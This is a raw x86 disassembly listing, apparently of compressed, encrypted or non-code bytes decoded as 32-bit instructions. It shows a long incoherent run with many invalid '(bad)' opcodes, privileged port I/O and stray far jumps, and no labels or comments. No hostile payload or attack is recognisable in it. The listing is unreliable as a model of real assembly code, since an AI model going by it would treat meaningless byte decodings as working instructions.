  41df1c:	ss retf 
  41df1e:	repnz add BYTE PTR [edi-0x2b],cl
  41df22:	mov    esi,0xf9aaeb82
  41df27:	ss nop
  41df29:	inc    edi
  41df2a:	lea    ecx,[edi]
  41df2c:	mov    al,0x8c
  41df2e:	cmp    al,0x8d
  41df30:	sub    eax,0x592431e4
  41df35:	or     bl,BYTE PTR [ecx+0x7f]
  41df38:	xor    BYTE PTR [edx],ch
  41df3a:	add    ah,BYTE PTR [edi+0x54b583ac]
  41df40:	xlat   BYTE PTR ds:[ebx]
  41df41:	sub    ecx,eax
  41df43:	lea    ebp,[ecx]
  41df45:	jno    0x41df11
  41df47:	fwait
  41df48:	out    0xf7,eax
  41df4a:	inc    ecx
  41df4b:	xchg   ecx,eax
  41df4c:	stc    
  41df4d:	inc    edi
  41df4e:	mov    edi,cs
  41df50:	xor    DWORD PTR [eax+edx*2],edi
  41df53:	js     0x41dfad
  41df55:	xor    al,0x57
  41df57:	xchg   ebp,eax
  41df58:	and    ch,BYTE PTR [esi]
  41df5a:	int    0xe
  41df5c:	stos   BYTE PTR es:[edi],al
  41df5d:	inc    eax
  41df5e:	sbb    BYTE PTR [ebp+0x56108e1b],0x0
  41df65:	daa    
  41df66:	dec    eax
  41df67:	cmp    BYTE PTR [ecx+0x37],bh
  41df6a:	out    dx,al
  41df6b:	je     0x41dfeb
  41df6d:	je     0x41def3
  41df6f:	jl     0x41def5
  41df71:	jmp    0x72df:0x5c228440
  41df78:	cld    
  41df79:	ins    DWORD PTR es:[edi],dx
  41df7a:	xchg   ebx,eax
  41df7b:	inc    esi
  41df7c:	jecxz  0x41df63
  41df7e:	sub    eax,0xf860e294
  41df83:	into   
  41df84:	dec    edx
  41df85:	ret    
  41df86:	dec    eax
  41df87:	test   al,0xc4
  41df89:	dec    edi
  41df8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df8b:	dec    DWORD PTR [edx+0x55]
  41df8e:	push   eax
  41df8f:	or     BYTE PTR [ebx+eiz*1],0x46
  41df93:	jle    0x41df87
  41df95:	dec    edx
  41df96:	test   eax,0x97510f43
  41df9b:	dec    esi
  41df9c:	mov    edx,0xe58ab193
  41dfa1:	jnp    0x41dfc8
  41dfa3:	out    dx,eax
  41dfa4:	adc    eax,0x69e45a83
  41dfa9:	dec    ebp
  41dfaa:	jp     0x41df42
  41dfac:	mov    ah,0x3e
  41dfae:	stc    
  41dfaf:	mov    esi,0xed64e04b
  41dfb4:	fst    DWORD PTR ds:0x6e297d22
  41dfba:	mov    ah,0xe1
  41dfbc:	retf   0x8ea8
  41dfbf:	cmc    
  41dfc0:	pop    ecx
  41dfc1:	push   esi
  41dfc2:	leave  
  41dfc3:	fadd   st,st(4)
  41dfc5:	cld    
  41dfc6:	das    
  41dfc7:	cmp    BYTE PTR cs:[esi+0x1d],ch
  41dfcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfcc:	fcmovnbe st,st(2)
  41dfce:	inc    ebp
  41dfcf:	mov    WORD PTR [edi],es
  41dfd1:	push   es
  41dfd2:	mov    al,0x60
  41dfd4:	div    ebx
  41dfd6:	dec    edx
  41dfd7:	adc    ebp,DWORD PTR cs:[ebx+0x5bd935ef]
  41dfde:	and    BYTE PTR [ecx],0xeb
  41dfe1:	add    ah,BYTE PTR [edx]
  41dfe3:	xchg   edi,eax
  41dfe4:	mov    edx,0xe25194b
  41dfe9:	test   al,0x2d
  41dfeb:	sahf   
  41dfec:	ror    esp,0xb4
  41dfef:	mov    bh,0xa6
  41dff1:	iret   
  41dff2:	adc    eax,DWORD PTR [ecx]
  41dff4:	mov    ebx,0x8ea0bef2
  41dff9:	fwait
  41dffa:	ja     0x41e03d
  41dffc:	jb     0x41e039
  41dffe:	push   ds
  41dfff:	in     al,0x7a
  41e001:	aad    0x59
  41e003:	stc    
  41e004:	adc    ch,ah
  41e006:	jmp    0x4fe7:0x5bae1602
  41e00d:	mov    bl,0x57
  41e00f:	fwait
  41e010:	cmp    BYTE PTR [ecx],cl
  41e012:	push   ecx
  41e013:	push   ebp
  41e014:	std    
  41e015:	pop    eax
  41e016:	rcr    BYTE PTR [esi+0x2374bdb1],1
  41e01c:	jns    0x41e029
  41e01e:	test   dl,dl
  41e020:	ffreep st(2)
  41e022:	into   
  41e023:	pop    ds
  41e024:	sbb    dh,BYTE PTR [edi]
  41e026:	add    esp,edi
  41e028:	jno    0x41e013
  41e02a:	sbb    esi,DWORD PTR [ebp+0x49]
  41e02d:	(bad)  
  41e02e:	sti    
  41e02f:	xor    eax,0x1ec22147
  41e034:	es (bad) 
  41e036:	ffree  st(5)
  41e038:	push   0x1c
  41e03a:	sbb    al,0xbc
  41e03c:	sub    esi,eax
  41e03e:	sbb    DWORD PTR [ebp-0x7e],eax
  41e041:	sbb    al,0xf8
  41e043:	cmc    
  41e044:	add    al,0x2
  41e046:	ins    DWORD PTR es:[edi],dx
  41e047:	popf   
  41e048:	cmp    al,0x2d
  41e04a:	int    0x15
  41e04c:	dec    edx
  41e04d:	fst    DWORD PTR [ecx+eax*2+0x51]
  41e051:	add    eax,0x4d61beef
  41e056:	(bad)  
  41e057:	div    esp
  41e059:	cwde   
  41e05a:	ds (bad) 
  41e05c:	push   ds
  41e05d:	das    
  41e05e:	imul   ecx,DWORD PTR [edi],0x3efac857
  41e064:	jge    0x41e069
  41e066:	jb     0x41e09d
  41e068:	mov    ds:0x633ff0d9,eax
  41e06d:	sub    DWORD PTR [esi-0x2d3a0615],0x833452d4
  41e077:	add    eax,0xf74da1c5
  41e07c:	adc    eax,0xcbd36f52
  41e081:	outs   dx,BYTE PTR ds:[esi]
  41e082:	adc    al,bh
  41e084:	(bad)  [edx+edi*8]
  41e087:	mov    esp,0x65992302
  41e08c:	cmc    
  41e08d:	jmp    0x877be907
  41e092:	push   es
  41e093:	ror    esp,cl
  41e095:	test   al,0xde
  41e097:	inc    edi
  41e098:	loope  0x41e088
  41e09a:	mov    eax,ds:0x74bf8032
  41e09f:	daa    
  41e0a0:	pop    ebp
  41e0a1:	mov    dl,BYTE PTR [edi-0x1867b21]
  41e0a7:	shl    ecx,cl
  41e0a9:	add    eax,DWORD PTR [ebx]
  41e0ab:	sub    BYTE PTR [ecx],ah
  41e0ad:	ret    
  41e0ae:	pop    esi
  41e0af:	or     DWORD PTR [eax+0x60ebfa74],ebx
  41e0b5:	(bad)  
  41e0b6:	pop    es
  41e0b7:	jno    0x41e0ed
  41e0b9:	push   ecx
  41e0ba:	xchg   esp,eax
  41e0bb:	stc    
  41e0bc:	and    BYTE PTR [esp+esi*2+0x3435d87d],0xf0
  41e0c4:	or     al,0xcd
  41e0c6:	cdq    
  41e0c7:	stos   BYTE PTR es:[edi],al
  41e0c8:	popf   
  41e0c9:	cmp    al,ch
  41e0cb:	in     eax,dx
  41e0cc:	pop    eax
  41e0cd:	(bad)  
  41e0ce:	lea    eax,[ecx-0x2]
  41e0d1:	mov    ds:0x76dd0f80,eax
  41e0d6:	fwait
  41e0d7:	out    dx,eax
  41e0d8:	adc    BYTE PTR [ebx-0x160d544c],0xca
  41e0df:	shr    DWORD PTR [esi],cl
  41e0e1:	hlt    
  41e0e2:	lea    ebx,[ecx]
  41e0e4:	dec    ebx
  41e0e5:	data16 mov ch,0x2a
  41e0e8:	dec    edi
  41e0e9:	push   ecx
  41e0ea:	pusha  
  41e0eb:	adc    DWORD PTR [edx-0x2fa75e9b],esp
  41e0f1:	jle    0x41e0cf
  41e0f3:	inc    ebx
  41e0f4:	push   0xe9ee32c
  41e0f9:	montmul (bad)
  41e0fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0fb:	add    DWORD PTR [ebx],esp
  41e0fd:	ins    BYTE PTR es:[edi],dx
  41e0fe:	xor    DWORD PTR [edx],0x60
  41e101:	add    esi,edi
  41e103:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41e105:	mov    ds,WORD PTR [edi+0xb]
  41e108:	and    DWORD PTR [ecx-0x598da20b],0xffffffa9
  41e10f:	js     0x41e0fa
  41e111:	jnp    0x41e186
  41e113:	aaa    
  41e114:	push   ebx
  41e115:	pop    eax
  41e116:	scas   eax,DWORD PTR es:[edi]
  41e117:	mov    eax,ds:0x9da3841a
  41e11c:	sbb    al,0x4
  41e11e:	dec    ecx
  41e11f:	jmp    0x2c5c0931
  41e124:	dec    esi
  41e125:	mov    dh,0xb0
  41e127:	dec    ecx
  41e128:	and    eax,0x784f3386
  41e12d:	retf   0xfaaa
  41e130:	jle    0x41e193
  41e132:	repnz sub BYTE PTR [esp+ebp*2-0x70],ah
  41e137:	clc    
  41e138:	adc    al,ah
  41e13a:	xor    ebx,edi
  41e13c:	xchg   BYTE PTR [eax-0x25],bh
  41e13f:	lods   eax,DWORD PTR ds:[esi]
  41e140:	out    dx,eax
  41e141:	xchg   edi,eax
  41e142:	mov    eax,0xb355a320
  41e147:	(bad)  
  41e148:	push   ecx
  41e149:	add    BYTE PTR [ebp-0x180e08ab],al
  41e14f:	add    DWORD PTR [ebp+0x3164e3b],ecx
  41e155:	cmp    eax,DWORD PTR [ebx]
  41e157:	out    dx,al
  41e158:	retf   0xbd96
  41e15b:	add    BYTE PTR [ebp+0x6dfd6304],ah
  41e161:	cmp    cl,BYTE PTR [esp+eax*8-0x32]
  41e165:	icebp  
  41e166:	imul   eax,DWORD PTR [edi],0x5e
  41e169:	add    al,0x7f
  41e16b:	pop    edx
  41e16c:	xchg   edi,eax
  41e16d:	pop    ebx
  41e16e:	loop   0x41e13f
  41e170:	mov    BYTE PTR [edi-0x7],ah
  41e173:	pop    esp
  41e174:	push   edx
  41e175:	xchg   DWORD PTR [ecx],ebx
  41e177:	xchg   ebx,eax
  41e178:	jmp    0x41e1a4
  41e17a:	mov    BYTE PTR [esi-0x5514de0e],ah
  41e180:	xor    al,BYTE PTR [edi-0x7]
  41e183:	xchg   ebp,eax
  41e184:	ficomp WORD PTR [esi]
  41e186:	jae    0x41e14c
  41e188:	cmp    ecx,DWORD PTR [edi+0x1e]
  41e18b:	loope  0x41e1b7
  41e18d:	lods   al,BYTE PTR ds:[esi]
  41e18e:	sti    
  41e18f:	push   edi
  41e190:	dec    ebx
  41e191:	dec    ecx
  41e192:	pusha  
  41e193:	int3   
  41e194:	and    cl,BYTE PTR [eax]
  41e196:	inc    ebx
  41e197:	loop   0x41e186
  41e199:	out    0xe8,eax
  41e19b:	add    DWORD PTR [edx-0x57],eax
  41e19e:	or     ebx,DWORD PTR ds:[edx]
  41e1a1:	and    bh,dh
  41e1a3:	push   esp
  41e1a4:	out    0xed,al
  41e1a6:	dec    edx
  41e1a7:	bound  edi,QWORD PTR ds:0xb4e5840d
  41e1ad:	and    DWORD PTR [ebx+ecx*1+0x21b39fa8],esp
  41e1b4:	or     BYTE PTR [ebp+0x468222c1],0x31
  41e1bb:	loope  0x41e1fe
  41e1bd:	adc    BYTE PTR [eax-0x5a],cl
  41e1c0:	std    
  41e1c1:	loop   0x41e15e
  41e1c3:	out    0xe6,al
  41e1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1c6:	ror    BYTE PTR [eax+0x70],0xa0
  41e1ca:	stos   DWORD PTR es:[edi],eax
  41e1cb:	mov    ah,0x68
  41e1cd:	(bad)  [ecx-0x5b56cb0e]
  41e1d3:	cmp    ebx,esi
  41e1d5:	mov    esi,0x1937097e
  41e1da:	pusha  
  41e1db:	sub    BYTE PTR [eax],cl
  41e1dd:	mov    ch,0xed
  41e1df:	jo     0x2e76e4
  41e1e5:	jne    0x41e1e0
  41e1e7:	jg     0x41e215
  41e1e9:	mov    al,0x4a
  41e1eb:	inc    ebp
  41e1ec:	mov    edx,0x9aa25a16
  41e1f1:	out    0x67,al
  41e1f3:	inc    eax
  41e1f4:	mov    BYTE PTR [ebx-0x54c2ebfe],ah
  41e1fa:	sub    al,0xb5
  41e1fc:	in     al,dx
  41e1fd:	mov    ebp,0xf25ec8c5
  41e202:	push   esp
  41e203:	loopne 0x41e202
  41e205:	bound  edx,QWORD PTR [ecx+0x12178b29]
  41e20b:	adc    al,0xc
  41e20d:	xchg   ebx,eax
  41e20e:	addr16 leave 
  41e210:	xor    BYTE PTR [esi],ah
  41e212:	jmp    0x962df154
  41e217:	push   ss
  41e218:	pop    ebx
  41e219:	(bad)  
  41e21a:	cmp    ebp,DWORD PTR [ebx-0x11]
  41e21d:	xor    DWORD PTR [edx-0x7d],eax
  41e220:	sbb    BYTE PTR [ecx],0xda
  41e223:	leave  
  41e224:	in     al,dx
  41e225:	outs   dx,DWORD PTR ds:[esi]
  41e226:	das    
  41e227:	sbb    BYTE PTR [ebx+0x6],ch
  41e22a:	push   ss
  41e22b:	(bad)  
  41e22c:	daa    
  41e22d:	sub    al,0x56
  41e22f:	mov    ah,0x29
  41e231:	pushf  
  41e232:	fs jle 0x41e20e
  41e235:	xor    ebx,DWORD PTR [ebx+edx*2-0x90d3443]
  41e23c:	addr16 daa 
  41e23e:	jle    0x41e1e1
  41e240:	adc    DWORD PTR [edx],0x64
  41e243:	jle    0x41e20a
  41e245:	repnz pushf 
  41e247:	pop    ebp
  41e248:	shr    DWORD PTR [ebp+edx*4-0x3c],1
  41e24c:	mov    BYTE PTR [eax],bh
  41e24e:	pop    esp
  41e24f:	in     eax,0xcd
  41e251:	shl    BYTE PTR [ebx+0x5d8ee1ef],cl
  41e257:	and    bl,ah
  41e259:	sbb    ebp,DWORD PTR ds:0x448be19c
  41e25f:	fsub   st,st(6)
  41e261:	sbb    dh,ch
  41e263:	cmc    
  41e264:	bswap  ebp
  41e266:	xchg   esp,eax
  41e267:	pop    edx
  41e268:	add    BYTE PTR [ecx],0xe1
  41e26b:	retf   
  41e26c:	shr    BYTE PTR [edi+eax*8-0x745c98a5],0xcb
  41e274:	mov    cs,WORD PTR [ebp-0x111faaa0]
  41e27a:	jl     0x41e280
  41e27c:	jl     0x41e28b
  41e27e:	jge    0x41e280
  41e280:	test   eax,0xcd41d7b2
  41e285:	jge    0x41e245
  41e287:	popf   
  41e288:	jge    0x41e21a
  41e28a:	mov    eax,eax
  41e28c:	pop    esp
  41e28d:	mov    dh,0x79
  41e28f:	ret    0x6796
  41e292:	ffree  st(2)
  41e294:	jp     0x41e2f7
  41e296:	stos   DWORD PTR es:[edi],eax
  41e297:	daa    
  41e298:	cmp    DWORD PTR [edx],0x48
  41e29b:	fdiv   QWORD PTR [ebx]
  41e29d:	rol    BYTE PTR [edi+ebx*2],0x58
  41e2a1:	inc    ebp
  41e2a2:	and    ecx,DWORD PTR [ecx-0x426654ec]
  41e2a8:	cmp    eax,0x4eb2821
  41e2ad:	fisttp QWORD PTR [edi+0x38ccb2e4]
  41e2b3:	push   es
  41e2b4:	pop    esi
  41e2b5:	mov    cl,0x8d
  41e2b7:	mov    al,ds:0xa46a93ea
  41e2bc:	xor    edi,DWORD PTR [ebx+0x19016138]
  41e2c2:	sbb    esp,ebx
  41e2c4:	cmc    
  41e2c5:	cmovge ecx,edi
  41e2c8:	push   ebx
  41e2c9:	push   edi
  41e2ca:	cmp    esi,DWORD PTR [ecx-0x352257e9]
  41e2d0:	into   
  41e2d1:	add    al,0x2
  41e2d3:	adc    ch,bl
  41e2d5:	stos   DWORD PTR es:[edi],eax
  41e2d6:	inc    ecx
  41e2d7:	mov    esi,0xade5d5d0
  41e2dc:	cmp    al,BYTE PTR [ebx+0x8]
  41e2df:	out    0x98,eax
  41e2e1:	adc    bh,BYTE PTR [ebx+0x33]
  41e2e4:	cli    
  41e2e5:	dec    esp
  41e2e6:	and    al,0x8a
  41e2e8:	in     eax,0xda
  41e2ea:	pusha  
  41e2eb:	(bad)  
  41e2ed:	jle    0x41e2f3
  41e2ef:	rcr    BYTE PTR gs:[eax],0x8
  41e2f3:	gs pop esi
  41e2f5:	fidiv  DWORD PTR [eax+0x3e8d1a3]
  41e2fb:	std    
  41e2fc:	jmp    0xe134:0xffb10ba0
  41e303:	cmp    edx,edi
  41e305:	div    DWORD PTR [esi]
  41e307:	push   0xd609310c
  41e30c:	jp     0x41e38a
  41e30e:	add    esi,esp
  41e310:	adc    BYTE PTR [edx+0x82270e5],al
  41e316:	push   0xffffff91
  41e318:	call   0x9dd5:0x597ceb64
  41e31f:	sub    DWORD PTR [edi+0x6eb0660e],ebx
  41e325:	adc    ah,BYTE PTR [ecx]
  41e327:	call   0xac8e:0xf89e31
  41e32e:	ins    BYTE PTR es:[edi],dx
  41e32f:	in     al,0x29
  41e331:	lock jle 0x41e355
  41e334:	pusha  
  41e335:	scas   eax,DWORD PTR es:[edi]
  41e336:	sub    edi,eax
  41e338:	ins    BYTE PTR es:[edi],dx
  41e339:	mov    ebp,0x91bd2062
  41e33e:	jp     0x41e355
  41e340:	mov    dl,0x81
  41e342:	jb     0x41e2f4
  41e344:	sahf   
  41e345:	(bad)  
  41e346:	push   es
  41e347:	pop    ebp
  41e348:	mov    esi,0xdd150bd4
  41e34d:	jle    0x41e3c2
  41e34f:	lods   eax,DWORD PTR ds:[esi]
  41e350:	fistp  WORD PTR [edi-0x171ddf1e]
  41e356:	add    esi,DWORD PTR [esi+ebx*1+0x3a68d3a2]
  41e35d:	jmp    0x77555ffb
  41e362:	xchg   BYTE PTR [edi],ah
  41e364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e365:	mov    ecx,0xd2db86ed
  41e36a:	xor    cl,BYTE PTR [ebx-0x31ba404b]
  41e370:	popa   
  41e371:	mov    esi,0x754f50e1
  41e376:	push   ds
  41e377:	mov    esp,0xe559c6c7
  41e37c:	cmp    DWORD PTR [edi+0x6bfe6c03],edi
  41e382:	retf   
  41e383:	fadd   QWORD PTR ds:0x1d8e2d45
  41e389:	ins    DWORD PTR es:[edi],dx
  41e38a:	aam    0xaa
  41e38c:	mov    ebp,0x23a2eaf6
  41e391:	ret    
  41e392:	pop    esp
  41e393:	fnsave [edx+eax*4+0x62]
  41e397:	inc    ebp
  41e398:	cmp    esp,DWORD PTR [esi]
  41e39a:	push   edx
  41e39b:	outs   dx,BYTE PTR ds:[esi]
  41e39c:	cld    
  41e39d:	push   ecx
  41e39e:	dec    ebp
  41e39f:	mov    BYTE PTR [edi+edi*2-0x70],ah
  41e3a3:	shl    bh,1
  41e3a5:	je     0x41e35d
  41e3a7:	fisubr WORD PTR [ecx+0x69626e95]
  41e3ad:	lahf   
  41e3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3af:	mov    ch,0xff
  41e3b1:	add    DWORD PTR [ebp+0x64],edi
  41e3b4:	(bad)  
  41e3b5:	cs clc 
  41e3b7:	ret    0x3e37
  41e3ba:	aaa    
  41e3bb:	enter  0xa3b2,0xce
  41e3bf:	adc    ecx,DWORD PTR [ebx]
  41e3c1:	dec    dh
  41e3c3:	retf   
  41e3c4:	bound  edi,QWORD PTR [ebp+0x17]
  41e3c7:	xor    BYTE PTR [ebx],dl
  41e3c9:	dec    ebx
  41e3ca:	xor    DWORD PTR [edi],ebx
  41e3cc:	xchg   ecx,eax
  41e3cd:	mov    al,ds:0xcbb4bd04
  41e3d2:	loopne 0x41e3b1
  41e3d4:	cmp    BYTE PTR [eax+0x2fe42324],ch
  41e3da:	shl    DWORD PTR [ecx+ebp*1+0x30],cl
  41e3de:	jg     0x41e3ad
  41e3e0:	lods   al,BYTE PTR ds:[esi]
  41e3e1:	ds jmp 0x41e40c
  41e3e4:	mov    DWORD PTR [eax+0x41],ebp
  41e3e7:	dec    ebx
  41e3e8:	(bad)  
  41e3e9:	jg     0x41e447
  41e3eb:	lods   al,BYTE PTR ds:[esi]
  41e3ec:	cmp    bh,BYTE PTR [edi]
  41e3ee:	mov    esp,0x338b741
  41e3f3:	lock xchg ebx,eax
  41e3f5:	mov    esi,0x7967ee7f
  41e3fa:	das    
  41e3fb:	mov    edx,0x2c70f9e4
  41e400:	sub    BYTE PTR [edx],ah
  41e402:	and    eax,0x81aee9d8
  41e407:	inc    esi
  41e408:	xor    eax,0x83baaa60
  41e40d:	call   0x191:0xc9924f0
  41e414:	xchg   edi,eax
  41e415:	ins    DWORD PTR es:[edi],dx
  41e416:	jp     0x41e3b9
  41e418:	fild   DWORD PTR [ebx]
  41e41a:	rcr    DWORD PTR [edx+0x0],cl
  41e41d:	cmp    DWORD PTR [esi],esp
  41e41f:	mov    ebx,ss
  41e421:	or     eax,0xffe7b674
  41e426:	inc    ecx
  41e427:	xchg   BYTE PTR [edi],al
  41e429:	je     0x41e46f
  41e42b:	push   ecx
  41e42c:	aas    
  41e42d:	and    eax,0x754134bc
  41e432:	push   ss
  41e433:	xor    al,0xbe
  41e435:	loopne 0x41e499
  41e437:	mul    BYTE PTR [ebp+0x1a]
  41e43a:	pop    ecx
  41e43b:	and    ch,BYTE PTR [ecx-0x6c803b3b]
  41e441:	(bad)  
  41e442:	pop    eax
  41e443:	in     eax,0x3c
  41e445:	mov    WORD PTR [esi+0x2e903805],gs
  41e44b:	arpl   dx,bx
  41e44d:	das    
  41e44e:	xor    al,bh
  41e450:	mov    edx,ebp
  41e452:	pop    ecx
  41e453:	adc    eax,0xff80f5a4
  41e458:	frstor [ebx+edi*2+0x68]
  41e45c:	mov    edx,DWORD PTR [ebx+0x783d936b]
  41e462:	dec    ebx
  41e463:	fst    DWORD PTR [esi]
  41e465:	jo     0x41e437
  41e467:	cmp    DWORD PTR [ebp+0x54],eax
  41e46a:	mov    al,dh
  41e46c:	aaa    
  41e46d:	push   edx
  41e46e:	hlt    
  41e46f:	popa   
  41e470:	sub    al,0x55
  41e472:	or     cl,BYTE PTR [edx+0x425d27a1]
  41e478:	in     eax,0x9f
  41e47a:	adc    bl,BYTE PTR [ecx-0x628acaf2]
  41e480:	shl    DWORD PTR [edi+0x666e97f1],1
  41e486:	imul   eax,ebx,0xffffffdc
  41e489:	pop    ds
  41e48a:	cmp    bl,BYTE PTR [ecx+0x73]
  41e48d:	and    eax,DWORD PTR [ecx]
  41e48f:	pop    ss
  41e490:	ret    
  41e491:	sbb    BYTE PTR ds:[ecx],0x87
  41e495:	icebp  
  41e496:	aas    
  41e497:	mov    dl,0x8e
  41e499:	pop    edi
  41e49a:	int3   
  41e49b:	jno    0x41e42c
  41e49d:	inc    edx
  41e49e:	mov    BYTE PTR [eax-0x77074ab2],al
  41e4a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4a5:	pop    eax
  41e4a6:	inc    edi
  41e4a7:	mov    dh,0x53
  41e4a9:	xchg   edx,eax
  41e4aa:	mov    eax,ds:0xe14e1768
  41e4af:	aas    
  41e4b0:	jl     0x7b54e0a6
  41e4b6:	and    al,0xc2
  41e4b8:	repnz fdivr DWORD PTR [edx+0x43]
  41e4bc:	sbb    esp,DWORD PTR [edx]
  41e4be:	in     al,dx
  41e4bf:	xor    esi,DWORD PTR [eax-0x3b]
  41e4c2:	pop    edi
  41e4c3:	mov    eax,ds:0xb9fa09e
  41e4c8:	mov    esi,0x66ec9723
  41e4cd:	pop    ss
  41e4ce:	retf   
  41e4cf:	jno    0x41e49f
  41e4d1:	loopne 0x41e471
  41e4d3:	(bad)  
  41e4d4:	bound  eax,QWORD PTR [ebx+0x9]
  41e4d7:	je     0x41e46e
  41e4d9:	mov    ebp,0x8d080d8b
  41e4de:	lods   al,BYTE PTR ds:[esi]
  41e4df:	sti    
  41e4e0:	inc    ebx
  41e4e1:	enter  0x462c,0x13
  41e4e5:	mov    esi,0xe5772403
  41e4ea:	mov    al,0xcd
  41e4ec:	jge    0x41e484
  41e4ee:	mov    eax,ds:0x2e229b04
  41e4f3:	daa    
  41e4f4:	js     0x41e4f3
  41e4f6:	push   esp
  41e4f7:	mov    BYTE PTR [ebx-0x3644f991],bl
  41e4fd:	add    eax,0x8ea96ef6
  41e502:	jg     0x41e557
  41e504:	icebp  
  41e505:	imul   ecx,DWORD PTR [edx-0x5e],0x49
  41e509:	mov    bl,0x6b
  41e50b:	adc    ebp,DWORD PTR [ebx]
  41e50d:	or     eax,0x73b75931
  41e512:	mov    BYTE PTR [esi+eiz*8-0x4983c277],al
  41e519:	sbb    ebx,eax
  41e51b:	bound  ebx,QWORD PTR [ebx]
  41e51d:	push   ds
  41e51e:	scas   al,BYTE PTR es:[edi]
  41e51f:	gs mov ch,0xe8
  41e522:	mov    edx,0x82393247
  41e527:	out    dx,eax
  41e528:	push   ecx
  41e529:	clc    
  41e52a:	dec    ebp
  41e52b:	and    dh,bl
  41e52d:	and    bh,BYTE PTR [ebx+eax*4+0x31]
  41e531:	shl    BYTE PTR [ebx-0x1c],1
  41e534:	sub    ebp,ebx
  41e536:	cwde   
  41e537:	es (bad) 
  41e53a:	das    
  41e53b:	or     BYTE PTR [edi],dl
  41e53d:	xor    al,0x65
  41e53f:	in     al,0xaa
  41e541:	cmp    edx,ebp
  41e543:	out    dx,al
  41e544:	add    eax,0xfa8981a1
  41e549:	mov    dh,0x3e
  41e54b:	arpl   sp,bp
  41e54d:	cli    
  41e54e:	(bad)  
  41e54f:	push   esp
  41e550:	sbb    al,BYTE PTR [edi-0x451537bf]
  41e556:	add    DWORD PTR ds:0x4ecdb02b,edi
  41e55c:	out    dx,eax
  41e55d:	xchg   edx,eax
  41e55e:	repz mov edx,0x13ca36fc
  41e564:	or     eax,0xb6fb4a51
  41e569:	and    BYTE PTR [edi-0x41601fcd],ah
  41e56f:	je     0x41e513
  41e571:	sub    al,0x12
  41e573:	repz lock das 
  41e576:	leave  
  41e577:	rol    ecx,0xdb
  41e57a:	or     BYTE PTR [ebx-0x7646f912],bh
  41e580:	jno    0x41e51f
  41e582:	inc    esp
  41e583:	jo     0x41e57e
  41e585:	jb     0x41e5e9
  41e587:	ret    0xa728
  41e58a:	js     0x41e539
  41e58c:	pop    edx
  41e58d:	and    dh,BYTE PTR [ebp-0x9]
  41e590:	les    edi,FWORD PTR [ebx]
  41e592:	in     eax,dx
  41e593:	mov    eax,0x78268782
  41e598:	sub    al,0x54
  41e59a:	clc    
  41e59b:	(bad)  
  41e59c:	xor    BYTE PTR [esi-0x2abad3c9],bl
  41e5a2:	sub    eax,0x1ce96906
  41e5a7:	mov    ecx,0xdb054640
  41e5ac:	into   
  41e5ad:	(bad)  
  41e5af:	icebp  
  41e5b0:	cs adc al,0x5
  41e5b3:	int3   
  41e5b4:	fldcw  WORD PTR [edi-0x69]
  41e5b7:	sbb    esp,ebx
  41e5b9:	push   ebx
  41e5ba:	push   esp
  41e5bb:	fbld   TBYTE PTR [ebx-0x2e]
  41e5be:	stos   BYTE PTR es:[edi],al
  41e5bf:	and    dh,BYTE PTR [eax]
  41e5c1:	aas    
  41e5c2:	scas   eax,DWORD PTR es:[edi]
  41e5c3:	outs   dx,BYTE PTR ds:[esi]
  41e5c4:	mov    ch,0x6e
  41e5c6:	mov    ah,0x5d
  41e5c8:	fstp   DWORD PTR [ecx+ebx*8-0x4d2253ea]
  41e5cf:	jmp    0x41e570
  41e5d1:	jl     0x41e5fe
  41e5d3:	adc    esi,DWORD PTR [ebx]
  41e5d5:	dec    ebx
  41e5d6:	popf   
  41e5d7:	mov    esp,0xbddeaf9a
  41e5dc:	push   esi
  41e5dd:	out    dx,eax
  41e5de:	stc    
  41e5df:	test   BYTE PTR [ebx-0x3b],cl
  41e5e2:	xchg   ebp,eax
  41e5e3:	sar    edi,cl
  41e5e5:	adc    BYTE PTR [ebp-0x67],cl
  41e5e8:	mov    ch,0x51
  41e5ea:	mov    cl,0x1d
  41e5ec:	adc    eax,0x4c090d7e
  41e5f1:	pusha  
  41e5f2:	or     esi,DWORD PTR [edx-0xc]
  41e5f5:	xchg   BYTE PTR [edx-0x1e],dl
  41e5f8:	enter  0xcad5,0xd4
  41e5fc:	mov    dh,BYTE PTR [ecx-0x1b]
  41e5ff:	add    ebx,DWORD PTR [ecx]
  41e601:	in     eax,dx
  41e602:	pop    ebp
  41e603:	xor    eax,0x792b0df1
  41e608:	add    DWORD PTR [edi+ecx*1+0x3fa35693],esi
  41e60f:	inc    edx
  41e610:	mov    DWORD PTR [eax],esi
  41e612:	ins    BYTE PTR es:[edi],dx
  41e613:	pop    ebx
  41e614:	xchg   esp,eax
  41e615:	or     bl,BYTE PTR [ebp-0xf0ab68a]
  41e61b:	inc    eax
  41e61c:	ins    DWORD PTR es:[edi],dx
  41e61d:	fidivr WORD PTR [esi+esi*1+0x73]
  41e621:	fs jl  0x41e67d
  41e624:	mov    esi,esi
  41e626:	(bad)  
  41e627:	aas    
  41e628:	sbb    dl,BYTE PTR [edi]
  41e62a:	js     0x41e5d2
  41e62c:	call   DWORD PTR [ecx-0xf810d83]
  41e632:	mov    al,ds:0x8787043b
  41e637:	ins    BYTE PTR es:[edi],dx
  41e638:	mov    ?,ebp
  41e63a:	clc    
  41e63b:	mov    ebp,edi
  41e63d:	mov    eax,0xd74a291e
  41e642:	add    esp,edi
  41e644:	xchg   esp,eax
  41e645:	inc    edi
  41e646:	aam    0x76
  41e648:	stos   BYTE PTR es:[edi],al
  41e649:	sbb    BYTE PTR [ecx-0x53],bl
  41e64c:	adc    BYTE PTR [ecx-0x67783a60],ch
  41e652:	ja     0x41e676
  41e654:	(bad)  
  41e655:	lods   eax,DWORD PTR ds:[esi]
  41e656:	call   0x39ab:0x66b8d8fe
  41e65d:	add    al,0xc
  41e65f:	test   ebp,ebx
  41e661:	push   ebp
  41e662:	bound  edx,QWORD PTR [edi+esi*2-0x666b659d]
  41e669:	sbb    eax,0x3441d604
  41e66e:	xchg   esi,eax
  41e66f:	div    BYTE PTR [ecx+0x5f107fdc]
  41e675:	icebp  
  41e676:	mov    esp,DWORD PTR [ebp+0x3b8bb1d1]
  41e67c:	js     0x41e6bd
  41e67e:	pop    esp
